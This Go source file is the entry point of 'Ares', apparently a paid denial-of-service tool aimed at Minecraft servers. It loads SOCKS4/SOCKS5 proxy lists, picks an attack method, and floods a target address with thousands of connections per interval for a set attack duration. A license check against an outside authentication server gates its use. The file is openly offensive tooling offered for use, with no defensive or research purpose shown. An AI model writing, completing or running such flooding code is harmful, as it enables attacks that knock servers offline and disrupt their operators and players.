package main

import (
	"Ares/core"
	"Ares/core/methods"
	"Ares/net/proxy"
	"Ares/utils"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
	"time"
)

var key string
var user string

var (
	addr     = flag.String("addr", "0.0.0.0:25565", "Server address")
	protocol = flag.Int("protocol", 761, "Server Version Protocol ID")
	delay    = flag.Int("delay", 1, "Delay between each connection loop")
	perDelay = flag.Int("per", 12000, "Connections per Delay")
	method   = flag.String("method", "cps", "Method name")
	duration = flag.Int("duration", 600, "Attack duration")
	timeout  = flag.Uint("timeout", 5, "Proxy connection timeout")
)

var err error

func init() {
	flag.StringVar(&key, "key", "", "Product key")
	flag.StringVar(&user, "user", "", "Username")
	flag.Parse()

	if key == "" || user == "" {
		fmt.Printf("Key and user must be specified as command-line arguments.\n")
		os.Exit(1)
	}

	if !checkAuth(key, user) {
		fmt.Printf("Key and user are not valid.\n")
		os.Exit(1)
	}
}

func main() {
	fmt.Printf("Starting Ares \nMade by: AverageBeing#5841\n")

	manager := core.ProxyManager{}
	err = utils.LoadFromFile(proxy.SOCKS4, time.Duration(*timeout)*time.Second, "socks4.txt", &manager)
	if err != nil {
		fmt.Println(err)
	}
	err = utils.LoadFromFile(proxy.SOCKS5, time.Duration(*timeout)*time.Second, "socks5.txt", &manager)
	if err != nil {
		fmt.Println(err)
	}

	if manager.Length() == 0 {
		os.Exit(69)
	}

	fmt.Printf("loaded %d proxies\n", manager.Length())

	conf := core.NewConfig(*addr, *protocol, &manager, *perDelay, time.Duration(*delay)*time.Second)

	methd, err := methods.GetMethod(strings.TrimSpace(strings.ToLower(*method)), conf)
	if err != nil {
		log.Fatal(err)
	}

	methd.Start()
	fmt.Println("Attack started")
	time.Sleep(time.Duration(*duration) * time.Second)
	fmt.Println("Attack ended")
}

func checkAuth(key, user string) bool {
	url := fmt.Sprintf("http://catondrugs.wtf:8080/verify?key=%s&user=%s", key, user)

	resp, err := http.Get(url)
	if err != nil {
		log.Println(err)
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Printf("Auth API returned %d StatusCode. Contact AverageBeing#5841 to fix this.", resp.StatusCode)
		return false
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Println(err)
		return false
	}

	if string(body) != "pass" {
		log.Println("Failed to authenticate")
		return false
	}

	return true
}
